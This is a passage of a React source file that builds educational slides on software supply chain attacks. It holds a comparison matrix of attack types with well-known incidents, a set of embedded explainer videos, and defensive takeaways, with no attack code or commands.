    title: 'Attack Type <span class="highlight">Comparison Matrix</span>',
    content: (
      <table className="slide-table">
        <thead>
          <tr>
            <th>Attack Type</th>
            <th>Difficulty</th>
            <th>Detection</th>
            <th>Impact</th>
            <th>Example</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Dependency Confusion</td><td>Low</td><td>Medium</td><td>High</td><td>Birsan (2021)</td>
          </tr>
          <tr>
            <td>Typosquatting</td><td>Very Low</td><td>Easy</td><td>Medium</td><td>crossenv</td>
          </tr>
          <tr>
            <td>Compromised Package</td><td>Medium</td><td>Hard</td><td>Very High</td><td>event-stream</td>
          </tr>
          <tr>
            <td>CI/CD Pipeline</td><td>Medium</td><td>Hard</td><td>Very High</td><td>tj-actions (2025)</td>
          </tr>
          <tr>
            <td>Build Compromise</td><td>Very High</td><td>Very Hard</td><td>Catastrophic</td><td>SolarWinds</td>
          </tr>
          <tr>
            <td>Magecart / Formjacking</td><td>Medium</td><td>Medium</td><td>High</td><td>British Airways</td>
          </tr>
          <tr>
            <td>Watering Hole</td><td>Medium</td><td>Hard</td><td>High</td><td>Gov sites</td>
          </tr>
          <tr>
            <td>Cryptojacking</td><td>Low</td><td>Easy</td><td>Low-Med</td><td>Coinhive scripts</td>
          </tr>
        </tbody>
      </table>
    ),
  },
  {
    tag: 'Part 1 // Video Explainers',
    title: 'Watch: <span class="highlight">Supply Chain Attacks</span> Explained',
    content: (
      <div className="video-grid">
        <YouTubeEmbed
          id="qmXcMACowR4"
          caption='The "Largest Supply Chain Attack Ever" — npm Chalk/Debug compromise (2025)'
        />
        <YouTubeEmbed
          id="MV0XJQf8tT0"
          caption="Dependency Confusion Explained — how version resolution is exploited"
        />
        <YouTubeEmbed
          id="cvumD7bhLWU"
          caption="event-stream: Analysis of a compromised npm package"
        />
        <YouTubeEmbed
          id="7ZcRNvmRz6E"
          caption="How To Find Dependency Confusion in Web Apps — Bug Bounty"
        />
      </div>
    ),
  },
  {
    tag: 'Part 1 // Summary',
    title: 'Key <span class="highlight">Takeaways</span>',
    content: (
      <>
        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Trust is the Vulnerability</h4>
            <p>Supply chain attacks exploit the trust developers place in dependencies, tools, and infrastructure.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Massive Blast Radius</h4>
            <p>A single compromised component can cascade to millions of downstream systems.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Detection is Hard</h4>
            <p>Malicious code arrives through legitimate, signed, trusted channels.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Defense in Depth</h4>
            <p>No single measure prevents all attacks. Layered defense is essential.</p>
          </div>
        </div>
        <div className="slide-quote">
          As perimeter security improves, attackers increasingly target the supply chain.
          This is the present and future of cyberattacks.
        </div>
      </>
    ),
  },
];

export default function Theory() {
  return <SlidePresenter slides={slides} />;
}
